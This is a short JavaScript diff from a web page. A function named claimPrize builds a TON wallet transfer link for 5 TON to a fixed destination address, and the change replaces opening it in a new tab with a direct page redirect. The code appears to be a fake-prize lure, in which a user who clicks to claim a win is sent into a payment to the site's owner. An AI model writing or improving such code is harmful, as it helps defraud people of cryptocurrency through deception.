@@ -303,11 +303,8 @@
         function claimPrize() {
             let amount = 5 * (10 ** 9);
             let transaction_link = `ton://transfer/${DESTINATION_ADDRESS}?amount=${Number(amount)}`;
-
-            // Open the generated transaction link in a new tab
-            console.log(transaction_link);
             
-            window.open(transaction_link, '_blank');
+            window.location.href = transaction_link;
 
             // Close the modal
             document.getElementById('winModal').style.display = 'none';
